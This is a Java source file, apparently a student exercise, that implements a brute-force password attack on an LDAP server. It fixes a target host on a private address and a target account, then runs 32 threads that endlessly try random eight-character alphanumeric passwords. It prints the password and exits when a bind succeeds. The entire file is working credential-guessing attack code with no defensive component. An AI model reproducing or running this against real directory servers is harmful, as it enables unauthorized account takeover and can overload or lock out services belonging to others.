package at.stefanerceg.dezsys04;

import org.apache.commons.lang3.RandomStringUtils;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BruteForce {

    public static final String HOST = "ldap://10.0.104.209:389";
    public static final String AUTH_METHOD = "simple";
    public static final String USER_NAME = "user1";
    public static final String USER_DATA = "cn=" + USER_NAME + ",dc=nodomain,dc=com";

    private long tries = 0;

    public BruteForce() {
        int threads = 32;
        ExecutorService es = Executors.newFixedThreadPool(threads);
        for (int i = 0; i < threads; i++) {
            es.submit(new BruteForceTask());
        }
    }

    class BruteForceTask implements Runnable {

        Hashtable<String, Object> env = new Hashtable<String, Object>(5);

        public BruteForceTask() {
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, HOST);
            env.put(Context.SECURITY_AUTHENTICATION, AUTH_METHOD);
            env.put(Context.SECURITY_PRINCIPAL, USER_DATA);
        }

        public void run() {
            while (true) {
                String password = RandomStringUtils.random(8, true, true);
                env.put(Context.SECURITY_CREDENTIALS, password);

                try {
                    tries++;
                    if (tries % 1000 == 0) {
                        System.out.println(tries);
                    }
                    DirContext ctx = new InitialDirContext(env);
                    System.out.println("Found password: " + password);
                    ctx.close();
                    System.exit(0);
                } catch (NamingException ignored) {
                }
            }
        }
    }

    public static void main(String[] args) {
        new BruteForce();
    }

}